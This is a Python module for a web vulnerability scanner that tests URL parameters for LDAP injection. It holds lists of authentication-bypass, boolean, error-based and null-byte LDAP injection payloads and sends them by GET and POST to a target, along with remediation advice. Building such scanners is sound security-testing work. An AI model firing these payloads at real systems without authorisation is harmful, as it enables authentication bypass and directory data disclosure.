# scanner/injection/ldapi.py
"""
LDAP Injection Scanner

Detects LDAP injection vulnerabilities that can lead to:
- Authentication bypass
- Information disclosure
- Data manipulation

OWASP: A03:2021 - Injection
CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional
from urllib.parse import urlencode

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class LDAPInjectionScanner(BaseScanner):
    """Scanner for LDAP injection vulnerabilities"""
    
    name="LDAP Injection Scanner",
    description="Detects LDAP injection vulnerabilities",
    owasp_category=OWASPCategory.A03_INJECTION

    def __init__(self):
        
        # LDAP injection payloads
        self.payloads = {
            # Authentication bypass payloads
            "auth_bypass": [
                "*",
                "*)(&",
                "*)(uid=*))(|(uid=*",
                "admin)(&)",
                "admin)(|(password=*)",
                "*)(objectClass=*",
                "x' or name()='username' or 'x'='y",
                "*)((|userPassword=*)",
                "*))%00",
            ],
            
            # Boolean-based payloads
            "boolean": [
                ")(cn=*",
                ")(|(cn=*",
                "*)(|(objectClass=*)",
                "admin)(!(&(1=0",
                "*))(&(objectClass=void",
                ")(|(objectClass=*))(&(objectClass=void",
            ],
            
            # Error-based payloads
            "error": [
                "\\",
                "\\\\",
                ")((",
                "))((",
                "*|",
                "|*",
                "*()|&'",
                "*)(AAAA",
            ],
            
            # Wildcard payloads
            "wildcard": [
                "*",
                "**",
                "*)*",
                "*)(*",
                "a]",
                "a*",
                "a*)((objectClass=*)",
            ],
            
            # NULL byte injection
            "null_byte": [
                "admin%00",
                "*%00",
                "*)%00",
                "admin)%00",
            ],
            
            # Attribute injection
            "attribute": [
                "admin)(|(userPassword=*)",
                "*)(uid=*)(|(objectClass=*)",
                "admin)(objectClass=user)(|(cn=*)",
            ],
        }
        
        # Error indicators suggesting LDAP interaction
        self.error_indicators = [
            r"ldap_",
            r"LDAP.*error",
            r"Invalid DN",
            r"Bad search filter",
            r"DSA is unavailable",
            r"NamingException",
            r"javax\.naming",
            r"LDAPException",
            r"supplied argument is not a valid ldap",
            r"ldap_search\(",
            r"ldap_bind\(",
            r"Active Directory",
            r"objectClass",
            r"attributeError",
            r"LDAP connection",
            r"search filter",
            r"size limit exceeded",
        ]
        
        # Success indicators for auth bypass
        self.success_indicators = [
            r"welcome",
            r"logged in",
            r"dashboard",
            r"authenticated",
            r"session",
            r"token",
            r"admin",
            r"profile",
        ]
        
        # Parameters likely to be used in LDAP queries
        self.target_params = [
            "username", "user", "uid", "login", "cn", "dn",
            "name", "search", "query", "filter", "email",
            "admin", "account", "id", "member", "group",
        ]
    
    async def scan(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> List[Vulnerability]:
        """
        Scan for LDAP injection vulnerabilities.
        
        Args:
            session: aiohttp client session
            url: Target URL
            params: Parameters to test
            
        Returns:
            List of discovered LDAP injection vulnerabilities
        """
        vulnerabilities = []
        
        if not params:
            # Create test params from common LDAP-related parameter names
            params = {p: "test" for p in self.target_params[:5]}
        
        # Get baseline response
        baseline = await self._get_baseline(session, url, params)
        
        for param_name, original_value in params.items():
            # Test auth bypass payloads
            auth_vulns = await self._test_auth_bypass(
                session, url, params, param_name, baseline
            )
            vulnerabilities.extend(auth_vulns)
            
            # Test error-based payloads
            error_vulns = await self._test_error_based(
                session, url, params, param_name
            )
            vulnerabilities.extend(error_vulns)
            
            # Test boolean-based payloads
            bool_vulns = await self._test_boolean_based(
                session, url, params, param_name, baseline
            )
            vulnerabilities.extend(bool_vulns)
            
            # Stop if we found vulnerabilities for this param
            if auth_vulns or error_vulns or bool_vulns:
                break
        
        return vulnerabilities
    
    async def _get_baseline(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str]
    ) -> Dict:
        """Get baseline response for comparison"""
        try:
            async with session.get(
                url,
                params=params,
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as response:
                text = await response.text()
                return {
                    "status": response.status,
                    "length": len(text),
                    "text": text
                }
        except:
            return {"status": 0, "length": 0, "text": ""}
    
    async def _test_auth_bypass(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str,
        baseline: Dict
    ) -> List[Vulnerability]:
        """Test for LDAP authentication bypass"""
        vulnerabilities = []
        
        for payload in self.payloads["auth_bypass"]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                # Test GET
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    # Check for auth bypass success
                    if self._check_auth_bypass_success(text, baseline):
                        vulnerabilities.append(Vulnerability(
                            vuln_type="LDAP Injection - Authentication Bypass",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence="Authentication bypass successful",
                            description="LDAP injection allows authentication bypass",
                            cwe_id="CWE-90",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
                
                # Test POST
                async with session.post(
                    url,
                    data=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    if self._check_auth_bypass_success(text, baseline):
                        vulnerabilities.append(Vulnerability(
                            vuln_type="LDAP Injection - Authentication Bypass",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence="Authentication bypass via POST",
                            description="LDAP injection in POST allows authentication bypass",
                            cwe_id="CWE-90",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _test_error_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str
    ) -> List[Vulnerability]:
        """Test for error-based LDAP injection"""
        vulnerabilities = []
        
        for payload in self.payloads["error"]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    # Check for LDAP error messages
                    error_found, evidence = self._check_ldap_errors(text)
                    
                    if error_found:
                        vulnerabilities.append(Vulnerability(
                            vuln_type="LDAP Injection - Error Based",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=evidence,
                            description="LDAP error messages indicate injection vulnerability",
                            cwe_id="CWE-90",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _test_boolean_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str,
        baseline: Dict
    ) -> List[Vulnerability]:
        """Test for boolean-based LDAP injection"""
        vulnerabilities = []
        
        # Test with true and false conditions
        true_payloads = ["*)(cn=*", "*)(objectClass=*"]
        false_payloads = ["*)(cn=NONEXISTENT123", "*)(objectClass=NONEXISTENT123"]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                # True condition
                test_params_true = params.copy()
                test_params_true[param_name] = true_payload
                
                async with session.get(
                    url,
                    params=test_params_true,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    true_text = await response.text()
                    true_length = len(true_text)
                
                # False condition
                test_params_false = params.copy()
                test_params_false[param_name] = false_payload
                
                async with session.get(
                    url,
                    params=test_params_false,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    false_text = await response.text()
                    false_length = len(false_text)
                
                # Check for significant difference
                length_diff = abs(true_length - false_length)
                
                if length_diff > 100 or (true_length > 0 and length_diff / true_length > 0.2):
                    vulnerabilities.append(Vulnerability(
                        vuln_type="LDAP Injection - Boolean Based",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=f"True: {true_payload}, False: {false_payload}",
                        evidence=f"Response length diff: {length_diff} bytes",
                        description="Boolean-based LDAP injection detected through response differences",
                        cwe_id="CWE-90",
                        remediation=self._get_remediation()
                    ))
                    return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_auth_bypass_success(self, response: str, baseline: Dict) -> bool:
        """Check if authentication bypass was successful"""
        response_lower = response.lower()
        baseline_lower = baseline.get("text", "").lower()
        
        # Check for success indicators in response but not in baseline
        for pattern in self.success_indicators:
            if re.search(pattern, response_lower) and not re.search(pattern, baseline_lower):
                return True
        
        # Check for significant response change
        if len(response) > baseline.get("length", 0) * 1.5:
            return True
        
        return False
    
    def _check_ldap_errors(self, response: str) -> tuple:
        """Check for LDAP error messages"""
        for pattern in self.error_indicators:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response), match.end() + 50)
                evidence = response[start:end]
                return True, evidence
        
        return False, ""
    
    def _get_remediation(self) -> str:
        """Get remediation advice"""
        return """
1. Use parameterized LDAP queries or prepared statements
2. Implement strict input validation with allowlists
3. Escape special LDAP characters: * ( ) \\ NUL
4. Use LDAP frameworks that provide built-in protection
5. Implement least privilege for LDAP bind accounts
6. Enable LDAP query logging for monitoring

Special characters to escape:
- Backslash (\\) -> \\5c
- Asterisk (*) -> \\2a
- Open parenthesis (() -> \\28
- Close parenthesis ()) -> \\29
- NUL -> \\00
"""